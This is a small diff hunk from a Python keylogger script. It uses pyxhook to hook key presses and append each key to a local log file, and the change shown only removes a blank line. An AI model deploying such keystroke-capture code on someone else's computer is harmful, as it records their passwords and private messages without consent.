@@ -5,7 +5,6 @@ import pyxhook
 
 log_file = '/home/jamie/get_keylogged_son'
 
-
 def OnKeyPress(event):
     with open(log_file, 'a') as f:
         f.write('{}\n'.format(event.Key))
